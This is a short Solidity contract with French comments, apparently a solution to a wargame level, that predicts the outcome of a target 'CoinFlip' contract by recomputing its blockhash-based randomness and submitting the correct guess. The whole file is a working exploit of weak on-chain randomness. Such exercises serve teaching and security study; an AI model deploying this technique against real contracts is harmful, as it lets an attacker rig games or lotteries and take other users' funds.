// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// On définit une interface pour pouvoir appeler CoinFlip
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    // L'adresse du contrat CoinFlip déployé
    address public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = _target;
    }

    function cheat() public {
        // 1. On reproduit exactement le calcul de CoinFlip
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // 2. On envoie la réponse correcte à CoinFlip
        ICoinFlip(target).flip(side);
    }
}